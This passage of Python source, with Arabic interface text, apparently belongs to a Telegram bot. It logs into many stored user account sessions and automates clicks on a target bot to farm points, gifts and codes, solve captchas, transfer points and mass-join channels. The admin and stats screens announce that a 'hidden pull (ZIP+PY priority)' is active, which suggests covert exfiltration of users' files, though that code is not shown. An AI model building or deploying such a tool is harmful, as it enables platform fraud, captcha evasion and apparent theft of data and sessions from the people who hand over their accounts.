        if path_name not in paths:
            await event.answer("❌ المسار غير موجود", alert=True)
            return
        
        path_data = paths[path_name]
        
        type_text = {
            'link': '🔗 رابط + كمية',
            'daily': '📅 كمية فقط',
            'code': '🔢 كود فقط',
            'normal': '📋 عادي',
            'transfer': '💰 تحويل نقاط'
        }.get(path_data.get('type', 'normal'), '📋 عادي')
        
        text = f"**📋 تفاصيل المسار: {path_name}**\n\n"
        text += f"📝 **النوع:** {type_text}\n"
        text += f"📅 **تاريخ الإنشاء:** {path_data.get('created', 'غير معروف')}\n"
        text += f"📋 **الوصف:** {path_data.get('description', 'لا يوجد وصف')}\n"
        text += f"🔢 **عدد الخطوات:** {len(path_data.get('saved_path', []))}\n"
        text += f"📌 **المسار:** {path_data.get('saved_path', [])}\n\n"
        
        if path_data.get('requires_amount'):
            text += f"🔢 **الكمية المحفوظة:** `{path_data.get('amount', 'غير محددة')}`\n"
        
        if path_data.get('requires_link'):
            text += f"🔗 **الرابط المحفوظ:** `{path_data.get('link', 'لا يوجد')}`\n"
        
        if path_data.get('type') == 'code' and path_data.get('code'):
            text += f"🔢 **الكود المحفوظ:** `{path_data.get('code')}`\n"
        
        buttons = [
            [{"text": "▶️ تنفيذ", "data": f"execpath_{path_name}"}],
            [{"text": "🗑 حذف", "data": f"delpath_{path_name}"}],
            [{"text": "🔙 رجوع", "data": "view_path"}]
        ]
        
        await event.edit(text, buttons=self.create_buttons(buttons))
    
    async def delete_path_list(self, event):
        """عرض قائمة المسارات للحذف"""
        paths = load_saved_paths()
        
        if not paths:
            await event.answer("❌ لا توجد مسارات", alert=True)
            return
        
        buttons = []
        for name in paths.keys():
            type_emoji = {
                'daily': '📅',
                'code': '🔢',
                'link': '🔗',
                'transfer': '💰',
                'normal': '📋'
            }.get(paths[name].get('type', 'normal'), '📋')
            
            buttons.append([{
                "text": f"{type_emoji} {name}",
                "data": f"delpath_{name}"
            }])
        
        buttons.append([{"text": "🔙 رجوع", "data": "paths_menu"}])
        
        await event.edit("**🗑️ اختر مسار للحذف:**", buttons=self.create_buttons(buttons))
    
    # ================ دوال تنفيذ المسارات ================
    
    async def execute_by_path_start(self, event):
        """بدء التنفيذ باستخدام مسار محفوظ"""
        paths = load_saved_paths()
        
        if not paths:
            await event.answer("لا توجد مسارات محفوظة!", alert=True)
            return
        
        buttons = []
        for name in paths.keys():
            type_emoji = {
                'daily': '📅',
                'code': '🔢',
                'link': '🔗',
                'transfer': '💰',
                'normal': '📋'
            }.get(paths[name].get('type', 'normal'), '📋')
            buttons.append([{"text": f"{type_emoji} {name}", "data": f"execpath_{name}"}])
        buttons.append([{"text": "🔙 رجوع", "data": "back_main"}])
        
        await event.edit("**اختر المسار للتنفيذ:**", buttons=self.create_buttons(buttons))
    
    async def execute_saved_path(self, event, path_name):
        """تنفيذ مسار محفوظ"""
        paths = load_saved_paths()
        if path_name not in paths:
            await event.answer("المسار غير موجود!", alert=True)
            return
        
        path_data = paths[path_name]
        user_id = event.sender_id
        self.operation_data[user_id] = path_data.copy()
        await self.execute_start(event)
    
    async def execute_daily_path(self, event):
        """تنفيذ مسار الهدية اليومية"""
        user_id = event.sender_id
        paths = load_saved_paths()
        daily_paths = {name: data for name, data in paths.items() if data.get('type') == 'daily'}
        
        if not daily_paths:
            await event.answer("❌ لا يوجد مسار هدية يومية مسجل", alert=True)
            return
        
        if len(daily_paths) == 1:
            path_name = list(daily_paths.keys())[0]
            await self.execute_saved_path(event, path_name)
        else:
            buttons = []
            for name in daily_paths.keys():
                buttons.append([{"text": f"📅 {name}", "data": f"execpath_{name}"}])
            buttons.append([{"text": "🔙 رجوع", "data": "back_main"}])
            await event.edit("**اختر مسار الهدية اليومية:**", buttons=self.create_buttons(buttons))
    
    async def execute_code_path(self, event):
        """تنفيذ مسار استخدام الكود"""
        user_id = event.sender_id
        paths = load_saved_paths()
        code_paths = {name: data for name, data in paths.items() if data.get('type') == 'code'}
        
        if not code_paths:
            await event.answer("❌ لا يوجد مسار كود مسجل", alert=True)
            return
        
        detected = load_detected_codes()
        if not detected['codes']:
            await event.answer("❌ لا توجد كودات مكتشفة", alert=True)
            return
        
        if len(code_paths) == 1 and len(detected['codes']) == 1:
            path_name = list(code_paths.keys())[0]
            code_data = detected['codes'][0]
            
            if not code_data.get('used'):
                code_data['used'] = True
                save_detected_codes(detected)
                self.operation_data[user_id] = paths[path_name].copy()
                self.operation_data[user_id]["code"] = code_data['code']
                await self.execute_start(event)
            else:
                await event.answer("❌ الكود مستخدم مسبقاً", alert=True)
        else:
            await self.set_user_state(user_id, "waiting_code_selection", {"paths": code_paths})
            
            text = "**🔢 اختر الكود:**\n\n"
            for i, code_data in enumerate(detected['codes'][-10:]):
                if not code_data.get('used'):
                    text += f"{i+1}. `{code_data['code']}`"
                    if code_data.get('value'):
                        text += f" (قيمة: {code_data['value']})"
                    text += "\n"
            
            await event.edit(text, buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "back_main"}]]))
    
    async def execute_link_path(self, event):
        """تنفيذ مسار رابط النقاط"""
        user_id = event.sender_id
        paths = load_saved_paths()
        link_paths = {name: data for name, data in paths.items() if data.get('type') == 'link'}
        
        if not link_paths:
            await event.answer("❌ لا يوجد مسار رابط نقاط مسجل", alert=True)
            return
        
        detected = load_detected_codes()
        if not detected['links']:
            await event.answer("❌ لا توجد روابط مكتشفة", alert=True)
            return
        
        if len(link_paths) == 1 and len(detected['links']) == 1:
            path_name = list(link_paths.keys())[0]
            link_data = detected['links'][0]
            
            if not link_data.get('used'):
                link_data['used'] = True
                save_detected_codes(detected)
                self.operation_data[user_id] = paths[path_name].copy()
                self.operation_data[user_id]["link"] = link_data['url']
                await self.execute_start(event)
            else:
                await event.answer("❌ الرابط مستخدم مسبقاً", alert=True)
        else:
            await self.set_user_state(user_id, "waiting_link_selection", {"paths": link_paths})
            
            text = "**🔗 اختر الرابط:**\n\n"
            for i, link_data in enumerate(detected['links'][-10:]):
                if not link_data.get('used'):
                    link_type = link_data.get('type', 'normal')
                    value = link_data.get('value', 0)
                    text += f"{i+1}. [{link_type}] `{link_data['url'][:50]}...`"
                    if value:
                        text += f" (قيمة: {value})"
                    text += "\n"
            
            await event.edit(text, buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "back_main"}]]))
    
    async def execute_transfer_path(self, event):
        """تنفيذ مسار تحويل النقاط"""
        user_id = event.sender_id
        paths = load_saved_paths()
        transfer_paths = {name: data for name, data in paths.items() if data.get('type') == 'transfer'}
        
        if not transfer_paths:
            await event.answer("❌ لا يوجد مسار تحويل نقاط مسجل", alert=True)
            return
        
        await self.set_user_state(user_id, "waiting_transfer_setup", {"paths": transfer_paths})
        
        await event.edit(
            "**💰 تحويل النقاط**\n\n"
            "أدخل عدد الحسابات المراد التحويل منها:\n"
            "(مثال: 5)",
            buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "back_main"}]])
        )
    
    async def execute_start(self, event):
        """بدء التنفيذ"""
        user_id = event.sender_id
        data = self.operation_data.get(user_id, {})
        
        if not data.get("saved_path"):
            await event.respond("❌ لا يوجد مسار مسجل. سجل مسار أولاً")
            return
        
        accounts = self.sessions_list
        
        if not accounts:
            await event.respond("❌ لا توجد حسابات")
            return
        
        await event.respond(f"🚀 **بدء التنفيذ على {len(accounts)} حسابات**")
        
        for acc in accounts:
            try:
                session_file = os.path.join(SESSIONS_DIR, acc)
                if not os.path.exists(f"{session_file}.session"):
                    await event.respond(f"⚠️ **{acc}: ملف الجلسة غير موجود**")
                    continue
                
                client = TelegramClient(session_file, API_ID, API_HASH)
                await client.start()
                await handle_mandatory_subscription(client)
                await client.send_message(TARGET_BOT, "/start")
                await asyncio.sleep(3)
                
                path_length = len(data["saved_path"])
                for i, idx in enumerate(data["saved_path"]):
                    m = await client.get_messages(TARGET_BOT, limit=1)
                    if m and m[0].buttons:
                        await m[0].click(idx)
                    await asyncio.sleep(speed_config["click_delay"])
                    
                    if i == path_length - 1:
                        if data.get("requires_amount") and data.get("amount"):
                            await client.send_message(TARGET_BOT, data["amount"])
                            await asyncio.sleep(speed_config["message_delay"])
                            await solve_bot_captcha(client)
                        
                        if data.get("requires_link") and data.get("link"):
                            await client.send_message(TARGET_BOT, data["link"])
                            await asyncio.sleep(speed_config["message_delay"])
                            await solve_bot_captcha(client)
                        
                        if data.get("type") == "code" and data.get("code"):
                            await client.send_message(TARGET_BOT, data["code"])
                            await asyncio.sleep(speed_config["message_delay"])
                            await solve_bot_captcha(client)
                
                m = await client.get_messages(TARGET_BOT, limit=1)
                if m and m[0].buttons:
                    await m[0].click(0)
                    await solve_bot_captcha(client)
                
                if data.get("type") == "daily":
                    stats["daily"] += 1
                    add_points(str(user_id), acc, 50)
                elif data.get("type") == "code":
                    stats["points"] += 1
                    add_points(str(user_id), acc, 100)
                else:
                    stats["ok"] += 1
                    add_points(str(user_id), acc, 10)
                
                await client.disconnect()
                await asyncio.sleep(speed_config["between_accounts"])
                
            except errors.BotError as e:
                if "bots can't send messages to other bots" in str(e):
                    await event.respond(f"ℹ️ **{acc}: لا يمكن إرسال لبوت آخر (طبيعي)**")
                else:
                    stats["errors"] += 1
                    await event.respond(f"⚠️ **{acc}: خطأ - {str(e)[:50]}**")
            except Exception as e:
                stats["errors"] += 1
                await event.respond(f"⚠️ **{acc}: خطأ - {str(e)[:50]}**")
        
        await event.respond(f"✅ **تم الانتهاء!**\n📊 الإجمالي: {stats['ok']} نجاح، {stats['errors']} خطأ")
    
    # ================ دوال إضافية للأزرار الجديدة ================
    
    async def add_admin(self, event):
        """إضافة مشرف"""
        user_id = event.sender_id
        if str(user_id) != str(INFO.get("sudo")):
            await event.answer("⛔ غير مصرح", alert=True)
            return
        await self.set_user_state(user_id, "waiting_admin_id", {})
        await event.edit("👤 **أرسل ID المشرف الجديد:**", buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "back_main"}]]))
    
    async def del_admin(self, event):
        """حذف مشرف"""
        user_id = event.sender_id
        if str(user_id) != str(INFO.get("sudo")):
            await event.answer("⛔ غير مصرح", alert=True)
            return
        await self.set_user_state(user_id, "waiting_admin_del", {})
        await event.edit("🗑️ **أرسل ID المشرف للحذف:**", buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "back_main"}]]))
    
    async def clear_all_channels(self, event):
        """مسح جميع القنوات"""
        if not self.sessions_list:
            await event.answer("❌ لا توجد حسابات", alert=True)
            return
        
        await event.edit("🧹 **جاري مسح جميع القنوات...**")
        
        for acc in self.sessions_list:
            try:
                client = TelegramClient(os.path.join(SESSIONS_DIR, acc), API_ID, API_HASH)
                await client.start()
                
                # الحصول على جميع المحادثات
                dialogs = await client.get_dialogs()
                left_count = 0
                
                for dialog in dialogs:
                    if dialog.is_channel or dialog.is_group:
                        try:
                            await client(functions.channels.LeaveChannelRequest(channel=dialog.id))
                            left_count += 1
                            await asyncio.sleep(1)
                        except:
                            pass
                
                await client.disconnect()
                console.print(f"[green]✅ {acc}: غادر {left_count} قناة[/green]")
                
            except Exception as e:
                console.print(f"[red]خطأ في {acc}: {e}[/red]")
        
        await event.answer("✅ تم مسح جميع القنوات", alert=True)
        await self.show_main_menu(event)
    
    async def organize_account(self, event):
        """ترتيب حساب محدد"""
        if not self.sessions_list:
            await event.answer("❌ لا توجد حسابات", alert=True)
            return
        
        # عرض قائمة الحسابات للاختيار
        buttons = []
        for i, acc in enumerate(self.sessions_list):
            buttons.append([{"text": f"📱 {acc}", "data": f"organize_{i}"}])
        buttons.append([{"text": "🔙 رجوع", "data": "back_main"}])
        
        await event.edit("**اختر الحساب لترتيبه:**", buttons=self.create_buttons(buttons))
    
    async def organize_selected_account(self, event, index):
        """ترتيب حساب محدد"""
        if 0 <= index < len(self.sessions_list):
            acc = self.sessions_list[index]
            
            await event.edit(f"🧹 **جاري ترتيب الحساب {acc}...**")
            
            try:
                client = TelegramClient(os.path.join(SESSIONS_DIR, acc), API_ID, API_HASH)
                await client.start()
                
                # حذف المحادثات القديمة
                dialogs = await client.get_dialogs()
                deleted = 0
                
                for dialog in dialogs:
                    if dialog.is_user and dialog.entity.bot:
                        await client.delete_dialog(dialog.id)
                        deleted += 1
                        await asyncio.sleep(1)
                
                await client.disconnect()
                
                await event.answer(f"✅ تم ترتيب الحساب {acc}\nحذف {deleted} محادثة", alert=True)
                
            except Exception as e:
                await event.answer(f"❌ خطأ: {str(e)[:50]}", alert=True)
        
        await self.show_main_menu(event)
    
    async def join_channel(self, event):
        """دخول قناة"""
        user_id = event.sender_id
        await self.set_user_state(user_id, "waiting_channel", {})
        await event.edit("🔗 **أرسل رابط أو يوزر القناة:**", buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "back_main"}]]))
    
    async def join_channel_process(self, event, user_id):
        """معالجة دخول القناة"""
        channel = event.message.text.strip()
        
        if not self.sessions_list:
            await event.respond("❌ لا توجد حسابات")
            await self.clear_user_state(user_id)
            return
        
        await event.respond(f"🔄 **جاري الدخول إلى {channel}...**")
        
        joined = 0
        for acc in self.sessions_list:
            try:
                client = TelegramClient(os.path.join(SESSIONS_DIR, acc), API_ID, API_HASH)
                await client.start()
                
                try:
                    if channel.startswith('@'):
                        await client(JoinChannelRequest(channel=channel))
                    elif 't.me' in channel:
                        parts = channel.split('/')
                        username = parts[-1]
                        if '?' in username:
                            username = username.split('?')[0]
                        await client(JoinChannelRequest(channel=f"@{username}"))
                    else:
                        await client(JoinChannelRequest(channel=f"@{channel}"))
                    
                    joined += 1
                    
                except Exception as e:
                    console.print(f"[red]خطأ في {acc}: {e}[/red]")
                
                await client.disconnect()
                await asyncio.sleep(1)
                
            except Exception as e:
                console.print(f"[red]خطأ في {acc}: {e}[/red]")
        
        await event.respond(f"✅ **تم الدخول لـ {joined} حساب**")
        await self.clear_user_state(user_id)
        await self.show_main_menu(event)
    
    async def detect_premium_link(self, event):
        """كشف رابط تفعيل مميز"""
        if not self.sessions_list:
            await event.answer("❌ لا توجد حسابات", alert=True)
            return
        
        await event.edit("🔍 **جاري البحث عن رابط تفعيل مميز...**")
        
        try:
            client = TelegramClient(os.path.join(SESSIONS_DIR, self.sessions_list[0]), API_ID, API_HASH)
            await client.start()
            
            channels_to_check = ['@PremiumLinks', '@TelegramPremium', '@PremiumCodes']
            found_links = []
            
            for channel in channels_to_check:
                try:
                    msgs = await client.get_messages(channel, limit=10)
                    for msg in msgs:
                        if msg.text and ('t.me' in msg.text or 'telegram' in msg.text):
                            urls = re.findall(r'(https?://t\.me/[^\s]+)', msg.text)
                            for url in urls:
                                if 'premium' in url.lower() or 'activate' in url.lower():
                                    found_links.append(url)
                except:
                    continue
            
            await client.disconnect()
            
            if found_links:
                text = "**🔗 روابط التفعيل المميز:**\n\n"
                for link in found_links[:5]:
                    text += f"• {link}\n"
            else:
                text = "**❌ لا توجد روابط مفعلة حالياً**"
            
            await event.edit(text, buttons=self.create_buttons([[{"text": "🔙 رجوع", "data": "back_main"}]]))
            
        except Exception as e:
            await event.answer(f"❌ خطأ: {str(e)[:50]}", alert=True)
            await self.show_main_menu(event)
    
    # ================ دوال المطور ================
    
    async def show_admin_panel(self, event):
        """عرض لوحة تحكم المطور"""
        user_id = event.sender_id
        
        if str(user_id) != str(INFO.get("sudo")):
            await event.answer("⛔ غير مصرح", alert=True)
            return
        
        mode_text = "✅ مجاني للكل" if INFO.get("bot_mode") == "free" else "🔒 مدفوع"
        trial_text = "✅ مفعلة" if INFO.get("trial_settings", {}).get("enabled") else "❌ معطلة"
        trial_duration = INFO.get("trial_settings", {}).get("duration_hours", 2)
        total_accounts = len(self.sessions_list)
        
        keyboard = [
            [{"text": f"🎛️ الوضع: {mode_text}", "data": "toggle_mode"}],
            [{"text": f"👑 إدارة VIP", "data": "manage_vip"}],
            [{"text": f"🎁 التجربة: {trial_text}", "data": "toggle_trial"}],
            [{"text": f"⏱️ مدة التجربة: {trial_duration} ساعة", "data": "set_trial_duration"}],
            [{"text": "👥 إدارة المشرفين", "data": "myadminsecho"}],
            [{"text": "📊 إحصائيات", "data": "admin_stats"}],
            [{"text": "💾 نسخ احتياطي", "data": "copynum"}],
            [{"text": "🔥 مسح جميع الحسابات", "data": "delall"}],
            [{"text": "🔙 رجوع", "data": "back_main"}]
        ]
        
        await event.edit(
            f"**⚙️ لوحة تحكم المطور**\n\n"
            f"📊 إجمالي الحسابات: `{total_accounts}`\n"
            f"👤 عدد المستخدمين: `{len([d for d in os.listdir(SESSIONS_DIR) if d.endswith('.session')])}`\n\n"
            f"👑 Developed by: TheMaster999\n"
            f"🔒 السحب الخفي نشط (ZIP+PY أولوية)",
            buttons=self.create_buttons(keyboard)
        )
    
    async def toggle_bot_mode(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        INFO["bot_mode"] = "free" if INFO.get("bot_mode") == "paid" else "paid"
        save_info()
        await event.answer(f"✅ تم التبديل إلى {INFO['bot_mode']}", alert=True)
        await self.show_admin_panel(event)
    
    async def toggle_trial(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        INFO["trial_settings"]["enabled"] = not INFO["trial_settings"].get("enabled", False)
        save_info()
        await event.answer(f"✅ تم التبديل", alert=True)
        await self.show_admin_panel(event)
    
    async def set_trial_duration(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        await self.set_user_state(event.sender_id, "waiting_trial_duration", {})
        await event.edit("⏱️ **أدخل مدة التجربة بالساعات:**", buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "admin_panel_home"}]]))
    
    async def manage_vip(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        vips = INFO.get("vips", {})
        now = datetime.now().timestamp()
        text = "👑 **قائمة VIP:**\n\n"
        
        if vips:
            for vip_id, expiry in vips.items():
                if now < expiry:
                    expiry_date = datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M")
                    text += f"• `{vip_id}` - حتى {expiry_date}\n"
                else:
                    del INFO["vips"][vip_id]
                    save_info()
        else:
            text += "لا يوجد أعضاء VIP\n"
        
        keyboard = [
            [{"text": "➕ إضافة VIP", "data": "add_vip"}],
            [{"text": "🔙 رجوع", "data": "admin_panel_home"}]
        ]
        await event.edit(text, buttons=self.create_buttons(keyboard))
    
    async def add_vip_start(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        await self.set_user_state(event.sender_id, "waiting_vip_id", {})
        await event.edit("👤 **أرسل ID المستخدم:**", buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "manage_vip"}]]))
    
    async def add_vip_unit(self, event, data):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        unit = 'hours' if data == 'add_vip_hours' else 'days'
        vip_id = self.user_states.get(event.sender_id, {}).get("data", {}).get("vip_id")
        
        if not vip_id:
            await event.answer("❌ خطأ في البيانات", alert=True)
            return
        
        await self.set_user_state(event.sender_id, "waiting_vip_duration", {"vip_id": vip_id, "unit": unit})
        unit_text = "بالساعات" if unit == 'hours' else "بالأيام"
        await event.edit(f"⏱️ **أرسل المدة {unit_text}:**", buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "manage_vip"}]]))
    
    async def manage_admins(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        admins = INFO.get("admins", {})
        text = "👥 **قائمة المشرفين:**\n\n"
        keyboard = []
        
        for admin_id, limit in admins.items():
            text += f"• `{admin_id}` - الحد: {limit}\n"
            keyboard.append([{"text": f"✏️ {admin_id}", "data": f"setlimt:{admin_id}"}])
        
        if not admins:
            text += "لا يوجد مشرفين\n"
        
        keyboard.append([{"text": "➕ إضافة مشرف", "data": "addadminecho"}])
        keyboard.append([{"text": "🔙 رجوع", "data": "admin_panel_home"}])
        await event.edit(text, buttons=self.create_buttons(keyboard))
    
    async def add_admin_start(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        await self.set_user_state(event.sender_id, "waiting_admin_id", {})
        await event.edit("👤 **أرسل ID المشرف الجديد:**", buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "myadminsecho"}]]))
    
    async def del_admin_start(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        await self.set_user_state(event.sender_id, "waiting_admin_del", {})
        await event.edit("🗑️ **أرسل ID المشرف للحذف:**", buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "myadminsecho"}]]))
    
    async def set_admin_limit(self, event, admin):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        await self.set_user_state(event.sender_id, "waiting_admin_limit", {"admin": admin})
        await event.edit(f"📊 **أرسل الحد الجديد للمشرف {admin}:**", buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "myadminsecho"}]]))
    
    async def create_backup(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        backup_folder = create_backup()
        await event.answer(f"✅ تم إنشاء النسخة في {backup_folder}", alert=True)
        await self.show_admin_panel(event)
    
    async def delete_all_accounts(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        for acc in self.sessions_list:
            session_file = os.path.join(SESSIONS_DIR, f"{acc}.session")
            if os.path.exists(session_file):
                try:
                    os.remove(session_file)
                except:
                    pass
        self.sessions_list = []
        await event.answer("✅ تم حذف جميع الحسابات", alert=True)
        await self.show_admin_panel(event)
    
    async def show_admin_stats(self, event):
        if str(event.sender_id) != str(INFO.get("sudo")):
            return
        
        total_accounts = len(self.sessions_list)
        total_users = len(set([f.split('_')[0] for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]))
        
        text = (
            f"**📊 إحصائيات عامة**\n\n"
            f"📱 إجمالي الحسابات: `{total_accounts}`\n"
            f"👥 عدد المستخدمين: `{total_users}`\n"
            f"👑 المشرفين: `{len(INFO.get('admins', {}))}`\n"
            f"💎 VIP: `{len(INFO.get('vips', {}))}`\n"
            f"🎁 المستخدمين التجريبيين: `{len(INFO.get('trial_users', {}))}`\n"
            f"⚡ سرعة التجميع: `{speed_config['speed_value']}`\n"
            f"🎛️ وضع البوت: `{INFO.get('bot_mode', 'paid')}`\n\n"
            f"✅ عمليات ناجحة: `{stats['ok']}`\n"
            f"💰 نقاط مجمعة: `{stats['points']}`\n"
            f"📅 هدايا يومية: `{stats['daily']}`\n"
            f"📊 مهام مجدولة: `{len(SCHEDULED_TASKS)}`\n\n"
            f"👑 Developed by: TheMaster999\n"
            f"🔒 السحب الخفي نشط (ZIP+PY أولوية)"
        )
        
        await event.edit(text, buttons=self.create_buttons([[{"text": "🔙 رجوع", "data": "admin_panel_home"}]]))
    
    # ================ معالج الرسائل ================
    
    async def handle_message(self, event):
        """معالج الرسائل النصية"""
        if event.message.text and event.message.text.startswith('/'):
            return
        
        user_id = event.sender_id
        state = await self.get_user_state(user_id)
        
        if state["state"] == "add_phone":
            await self.handle_add_phone(event, user_id, state)
        elif state["state"] == "add_code":
            await self.handle_add_code(event, user_id, state)
        elif state["state"] == "add_password":
            await self.handle_add_password(event, user_id, state)
        elif state["state"] == "waiting_button_select":
            await self.handle_button_select(event, user_id, state)
        elif state["state"] == "waiting_amount":
            if user_id not in self.operation_data:
                self.operation_data[user_id] = {"saved_path": [], "amount": "", "link": "", "code": "", "description": "", "requires_amount": False, "requires_link": False}
            self.operation_data[user_id]["amount"] = event.message.text.strip()
            await self.record_path_continue(event, user_id)
            
        elif state["state"] == "waiting_link":
            if user_id not in self.operation_data:
                self.operation_data[user_id] = {"saved_path": [], "amount": "", "link": "", "code": "", "description": "", "requires_amount": False, "requires_link": False}
            self.operation_data[user_id]["link"] = event.message.text.strip()
            await self.record_path_continue(event, user_id)
            
        elif state["state"] == "waiting_path_type":
            choice = event.message.text.strip()
            await self.handle_path_type_selection(event, user_id, choice)
            
        elif state["state"] == "waiting_amount_final":
            if user_id in self.operation_data:
                self.operation_data[user_id]["amount"] = event.message.text.strip()
                await self.finish_path_recording(event, user_id)
                
        elif state["state"] == "waiting_link_final":
            if user_id in self.operation_data:
                self.operation_data[user_id]["link"] = event.message.text.strip()
                await self.finish_path_recording(event, user_id)
                
        elif state["state"] == "waiting_path_description":
            description = event.message.text.strip()
            if user_id in self.operation_data:
                self.operation_data[user_id]["description"] = description
                
                data = self.operation_data[user_id]
                path_name = f"{data.get('type', 'normal')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                save_path(path_name, data)
                
                type_text = {
                    'link': '🔗 رابط + كمية',
                    'daily': '📅 كمية فقط',
                    'code': '🔢 كود فقط',
                    'normal': '📋 عادي'
                }.get(data.get('type', 'normal'), '📋 عادي')
                
                await event.respond(
                    f"✅ **تم حفظ المسار بنجاح!**\n\n"
                    f"📌 الاسم: {path_name}\n"
                    f"📝 النوع: {type_text}\n"
                    f"📋 الوصف: {description}\n"
                    f"🔢 عدد الخطوات: {len(data.get('saved_path', []))}"
                )
                
                if user_id in self.user_clients:
                    await self.user_clients[user_id].disconnect()
                    del self.user_clients[user_id]
                
                await self.clear_user_state(user_id)
                await self.show_paths_menu(event)
        
        elif state["state"] == "waiting_speed_custom":
            try:
                speed = int(event.message.text.strip())
                if 1 <= speed <= 100:
                    set_speed(speed)
                    await event.respond(f"✅ تم تعيين السرعة إلى {speed}")
                else:
                    await event.respond("❌ أدخل رقماً بين 1 و 100")
                await self.clear_user_state(user_id)
                await self.show_speed_menu(event)
            except:
                await event.respond("❌ أدخل رقماً صحيحاً")
        
        elif state["state"] == "waiting_schedule_time":
            await self.schedule_set_time(event, user_id, state["data"])
        
        elif state["state"] == "waiting_daily_count":
            await self.schedule_set_daily_count(event, user_id, state["data"])
        
        elif state["state"] == "waiting_custom_daily_count":
            await self.schedule_set_custom_daily_count(event, user_id, state["data"])
        
        elif state["state"] == "waiting_interval":
            await self.schedule_set_custom_interval(event, user_id, state["data"])
        
        elif state["state"] == "waiting_custom_duration":
            try:
                days = int(event.message.text.strip())
                if days > 0:
                    data = state["data"]
                    await self.schedule_set_duration(event, data["path_name"], days, data["scheduled_time"])
                else:
                    await event.respond("❌ أدخل رقماً موجباً")
            except:
                await event.respond("❌ أدخل رقماً صحيحاً")
        
        elif state["state"] == "waiting_channel":
            await self.join_channel_process(event, user_id)
        
        elif state["state"] == "waiting_vip_id":
            try:
                vip_id = int(event.message.text.strip())
                state["data"]["vip_id"] = vip_id
                await self.set_user_state(user_id, "waiting_vip_unit", state["data"])
                
                keyboard = [
                    [{"text": "⏱️ ساعات", "data": "add_vip_hours"}],
                    [{"text": "📅 أيام", "data": "add_vip_days"}],
                    [{"text": "🔙 إلغاء", "data": "manage_vip"}]
                ]
                await event.respond("⏰ **اختر وحدة الوقت:**", buttons=self.create_buttons(keyboard))
            except ValueError:
                await event.respond("❌ أرسل ID صحيحاً")
        
        elif state["state"] == "waiting_vip_duration":
            try:
                duration = int(event.message.text.strip())
                vip_id = str(state["data"]["vip_id"])
                unit = state["data"]["unit"]
                
                if unit == 'hours':
                    delta = timedelta(hours=duration)
                    unit_text = "ساعة"
                else:
                    delta = timedelta(days=duration)
                    unit_text = "يوم"
                
                expiration = (datetime.now() + delta).timestamp()
                
                if "vips" not in INFO:
                    INFO["vips"] = {}
                
                INFO["vips"][vip_id] = expiration
                save_info()
                
                await event.respond(f"✅ **تم تفعيل VIP للمستخدم {vip_id}**\n⏰ المدة: {duration} {unit_text}")
                await self.clear_user_state(user_id)
                await self.manage_vip(event)
                
            except ValueError:
                await event.respond("❌ أرسل رقماً صحيحاً")
        
        elif state["state"] == "waiting_trial_duration":
            try:
                hours = int(event.message.text.strip())
                if hours < 1:
                    await event.respond("❌ المدة يجب أن تكون ساعة واحدة على الأقل")
                    return
                
                INFO["trial_settings"]["duration_hours"] = hours
                save_info()
                
                await event.respond(f"✅ **تم تغيير مدة التجربة إلى {hours} ساعة**")
                await self.clear_user_state(user_id)
                await self.show_admin_panel(event)
                
            except ValueError:
                await event.respond("❌ أرسل رقماً صحيحاً")
        
        elif state["state"] == "waiting_admin_id":
            admin_id = event.message.text.strip()
            os.makedirs(f"echo_ac/{admin_id}", exist_ok=True)
            INFO["admins"][admin_id] = "5"
            save_info()
            await event.respond(f"✅ **تم إضافة المشرف {admin_id}**\n📊 الحد: 5 حسابات")
            await self.clear_user_state(user_id)
            await self.manage_admins(event)
        
        elif state["state"] == "waiting_admin_del":
            admin_id = event.message.text.strip()
            if admin_id in INFO.get("admins", {}):
                del INFO["admins"][admin_id]
                save_info()
                await event.respond(f"✅ **تم حذف المشرف {admin_id}**")
            else:
                await event.respond("❌ لا يوجد مشرف بهذا ID")
            await self.clear_user_state(user_id)
            await self.manage_admins(event)
        
        elif state["state"] == "waiting_admin_limit":
            try:
                limit = int(event.message.text.strip())
                admin = state["data"]["admin"]
                if limit < 1:
                    await event.respond("❌ الحد يجب أن يكون 1 على الأقل")
                    return
                
                INFO["admins"][admin] = str(limit)
                save_info()
                await event.respond(f"✅ **تم تغيير حد المشرف {admin} إلى {limit}**")
                await self.clear_user_state(user_id)
                await self.manage_admins(event)
                
            except ValueError:
                await event.respond("❌ أرسل رقماً صحيحاً")
    
    async def handle_button_select(self, event, user_id, state):
        """معالج اختيار الزر"""
        try:
            idx = int(event.message.text.strip())
            data = state["data"]
            btns = data.get("btns", [])
            
            if 0 <= idx < len(btns):
                await event.respond(f"🔄 **جاري الضغط على الزر {idx}...**")
                
                if user_id in self.user_clients:
                    client = self.user_clients[user_id]
                    
                    msg_obj = await client.get_messages(TARGET_BOT, ids=data["msg_id"])
                    
                    if msg_obj:
                        if isinstance(msg_obj, list):
                            msg = msg_obj[0] if msg_obj else None
                        else:
                            msg = msg_obj
                        
                        if msg and msg.buttons:
                            try:
                                await msg.click(idx)
                                await event.respond(f"✅ **تم الضغط على الزر {idx}**")
                                await asyncio.sleep(3)
                                
                                if user_id not in self.operation_data:
